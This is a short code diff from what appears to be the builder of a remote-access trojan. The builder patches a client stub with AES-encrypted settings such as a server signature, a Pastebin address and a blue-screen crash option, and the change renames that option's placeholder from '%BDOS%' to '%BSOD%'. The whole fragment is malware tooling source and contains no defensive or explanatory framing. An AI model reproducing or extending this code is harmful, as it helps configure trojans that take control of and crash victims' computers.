@@ -189,6 +189,8 @@ namespace Server.Forms
 
             if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text)) return;
 
+
+
             ModuleDefMD asmDef = null;
             try
             {
@@ -434,8 +436,8 @@ namespace Server.Forms
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
                                         method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
 
-                                    if (method.Body.Instructions[i].Operand.ToString() == "%BDOS%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkBdos.Checked.ToString().ToLower());
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%BSOD%")
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkBsod.Checked.ToString().ToLower());
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
                                         if (chkPaste_bin.Checked)
